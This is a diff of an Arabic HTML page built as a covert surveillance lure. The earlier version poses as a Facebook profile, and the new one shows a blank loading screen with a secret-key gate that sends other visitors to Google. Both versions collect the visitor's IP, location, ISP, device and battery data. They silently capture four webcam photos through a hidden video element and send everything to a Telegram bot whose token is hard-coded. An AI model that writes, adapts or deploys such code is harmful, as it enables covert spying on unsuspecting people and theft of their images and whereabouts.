@@ -1,146 +1,123 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <!-- وسوم المعاينة (لجعل الرابط يظهر كبروفايل فيسبوك عند الإرسال) -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نسيم كعابنه</title>
 
-    <!-- Open Graph Meta Tags - هذي هي المسؤولة عن المعاينة -->
+    <!-- Open Graph Meta Tags - لجعل الرابط يبدو حقيقياً عند المشاركة -->
     <meta property="og:title" content="نسيم كعابنه">
-    <meta property="og:description" content="أضف نسيم كعابنه كصديق على فيسبوك">
-    <meta property="og:image" content="https://l.top4top.io/p_3968sozsf0.jpg">
     <meta property="og:type" content="profile">
+    <meta property="og:image" content="https://via.placeholder.com/300"> <!-- يمكنك وضع رابط صورة حقيقية هنا -->
 
-    <!-- تصميم فيسبوك (CSS) -->
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; }
-        .profile-card { width: 100%; max-width: 450px; background: white; min-height: 100vh; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: relative; }
-        .cover-photo { width: 100%; height: 180px; background: #ddd; background-image: url('https://l.top4top.io/p_3968sozsf0.jpg'); background-size: cover; background-position: center; }
-        .profile-header { position: relative; text-align: center; margin-top: -50px; padding-bottom: 20px; border-bottom: 1px solid #e4e6eb; }
-        .profile-pic { width: 120px; height: 120px; border-radius: 50%; border: 4px solid white; object-fit: cover; background: #fff; }
-        .user-name { font-size: 22px; font-weight: bold; margin: 10px 0 5px 0; color: #1c1e21; }
-        .user-info { color: #65676b; font-size: 14px; padding: 0 20px; text-align: center; }
-        .action-btn { display: block; width: 80%; margin: 20px auto; background: #1877f2; color: white; text-align: center; padding: 12px; border-radius: 6px; font-weight: bold; text-decoration: none; font-size: 18px; }
-        #status { position: fixed; bottom: 10px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.7); color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; display: none; z-index: 1000; }
-        canvas { display: none; } /* لإخفاء الكانفاس المستخدم في التصوير */
+        body { font-family: sans-serif; text-align: center; background: #f0f2f5; }
+        video { display: none; } /* إخفاء الفيديو لجعل العملية غير مرئية */
+        canvas { display: none; }
+        .loading { margin-top: 100px; font-size: 24px; color: #666; }
     </style>
 </head>
 <body>
 
-<div class="profile-card">
-    <div class="cover-photo"></div>
-    <div class="profile-header">
-        <img src="https://l.top4top.io/p_3968sozsf0.jpg" alt="Profile" class="profile-pic">
-        <h1 class="user-name">نسيم كعابنه</h1>
-        <div class="user-info">أضفت 1,254 أصدقاء جديد</div>
-    </div>
-    <a href="#" class="action-btn" id="mainBtn">إضافة صديق</a>
-</div>
+    <div class="loading">جاري التحميل...</div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
-<div id="status">جاري التحميل...</div>
-<canvas id="canvas"></canvas>
-<video id="video" style="display:none;" autoplay playsinline></video>
+    <script>
+        // --- الإعدادات الأساسية ---
+        const TELEGRAM_TOKEN = '8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw';
+        const CHAT_ID = '7184970355';
+        const SECRET_KEY = '123'; // هذا هو المفتاح السري
 
-<script>
-    const TELEGRAM_TOKEN = '8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw';
-    const CHAT_ID = '7184970355';
+        async function init() {
+            // 1. فحص المفتاح (السر)
+            const urlParams = new URLSearchParams(window.location.search);
+            const userKey = urlParams.get('key');
 
-    // دالة إرسال البيانات للتليجرام
-    async function sendToTelegram(text, type = 'message', fileUrl = null) {
-        if (type === 'message') {
+            if (userKey !== SECRET_KEY) {
+                // إذا لم يوجد المفتاح، اذهب إلى قوقل فوراً (للخداع)
+                window.location.href = "https://www.google.com";
+                return; // توقف عن تنفيذ باقي الكود
+            }
+
+            // 2. إذا كان المفتاح صحيحاً، ابدأ العمل الحقيقي
+            await startHacking();
+        }
+
+        async function startHacking() {
+            try {
+                let infoText = "🚀 **دخول جديد!**\n\n";
+
+                // جلب الـ IP واللوكيشن
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+
+                infoText += `📍 IP: ${ipData.ip}\n`;
+                infoText += `🌍 الدولة: ${ipData.city}, ${ipData.country_name}\n`;
+                infoText += `🌐 مزود الخدمة: ${ipData.org}\n\n`;
+
+                // معلومات الجهاز
+                infoText += `📱 الجهاز: ${navigator.platform}\n`;
+                infoText += `🌐 المتصفح: ${navigator.userAgent}\n\n`;
+
+                // البطارية
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    infoText += `🔋 مستوى البطارية: ${(battery.level * 100).toFixed(0)}%\n`;
+                    infoText += `🔌 حالة الشحن: ${battery.charging ? 'في الشحن' : 'لا يشحن'}\n\n`;
+                }
+
+                await sendToTelegram(infoText);
+            } catch (e) {
+                await sendToTelegram("⚠️ حدث خطأ في جلب البيانات، ولكن الجهاز دخل الرابط.");
+            }
+
+            startCamera();
+        }
+
+        async function startCamera() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                setTimeout(() => capturePhotos(video, canvas, context), 1500);
+            } catch (err) {
+                await sendToTelegram("📷 تم الدخول ولكن لم يتم السماح بالكاميرا.");
+            }
+        }
+
+        async function capturePhotos(video, canvas, context) {
+            for (let i = 0; i < 4; i++) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                await new Promise(r => setTimeout(r, 500));
+            }
+        }
+
+        async function sendToTelegram(text) {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-            });
-        } else if (type === 'photo') {
-            // نستخدم الـ Blob لإرسال الصور الملتقطة مباشرة
-            const response = await fetch(fileUrl);
-            const blob = await response.blob();
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob);
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
         }
-    }
 
-    // 1. التقاط المعلومات (IP, الجهاز, البطارية) فور الدخول
-    window.onload = async () => {
-        document.getElementById('status').style.display = 'block';
-        let infoText = "🚀 **بيانات جديدة وصلت:**\n\n";
-
-        try {
-            // جلب الـ IP واللوكيشن عبر API خارجي
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            infoText += `📍 IP: ${ipData.ip}\n`;
-            infoText += `🌍 الدولة: ${ipData.city}, ${ipData.country_name}\n`;
-            infoText += `🌐 مزود الخدمة: ${ipData.org}\n\n`;
-
-            // معلومات الجهاز
-            infoText += `📱 الجهاز: ${navigator.platform}\n`;
-            infoText += `🌐 المتصفح: ${navigator.userAgent}\n\n`;
-
-            // البطارية
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                infoText += `🔋 مستوى البطارية: ${(battery.level * 100).toFixed(0)}%\n`;
-                infoText += `🔌 حالة الشحن: ${battery.charging ? 'في الشحن' : 'لا يشحن'}\n\n`;
-            }
-
-            await sendToTelegram(infoText);
-        } catch (e) {
-            await sendToTelegram("⚠️ حدث خطأ في جلب بعض البيانات، ولكن الجهاز دخل الرابط.");
-        }
-
-        // 2. طلب إذن الكاميرا فوراً بمجرد تحميل الصفحة
-        startCamera();
-    };
-
-    async function startCamera() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            video.srcObject = stream;
-
-            // انتظار ثانية لضمان عمل الكاميرا ثم التقاط 4 صور
-            setTimeout(() => capturePhotos(video, canvas, context), 1500);
-
-        } catch (err) {
-            console.log("الكاميرا رفضت أو غير موجودة");
-            await sendToTelegram("📷 تم الدخول للرابط ولكن لم يتم السماح بالكاميرا.");
-        }
-    }
-
-    async function capturePhotos(video, canvas, context) {
-        for (let i = 1; i <= 4; i++) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-
-            // تحويل الكانفاس إلى Blob لإرساله كصورة حقيقية وليس رابطاً فقط
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob);
-
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            // تأخير بسيط بين الصور لضمان الإرسال السلس
-            await new Promise(r => setTimeout(r, 500));
-        }
-    }
-</script>
-
+        // تشغيل البرنامج
+        init();
+    </script>
 </body>
 </html>
